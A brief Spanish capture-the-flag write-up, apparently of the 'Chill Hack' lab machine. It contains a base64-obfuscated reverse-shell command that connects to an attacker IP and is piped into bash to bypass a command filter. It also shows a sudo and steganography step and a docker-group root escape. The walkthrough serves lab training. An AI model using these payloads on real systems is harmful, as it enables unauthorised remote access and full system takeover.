# chillhack

La web tenía un directorio /secret en el cual se podían ejecutar comandos pero te capaba algunas opciones, pero simplemente haciendo&#x20;



```bash
echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMS4yOC4xODgvNDQzIDA+JjE=" | base64 -d
echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMS4yOC4xODgvNDQzIDA+JjE=" | base64 -d | /bin/bash
```

podiamos ganar acceso a la maquina y la escalada de privilegios se hacia porque tenias permiso de ejucución con sudo sobre un archivo oculto el cual te permitía lanzarse una shell como otro usuario&#x20;



posteriormente para escalar privilegios a un usuario "admin" los archivos web tenian un jpg el cual con escanografía y sin contrasseña nos daba un archivo php el cual nos daba la contraseña en base 64 del nuevo usuario, el cual con acceso al grupo docker.

```purebasic
steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
```

con el comando&#x20;

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

y ganamos acceso como root en el sistema.
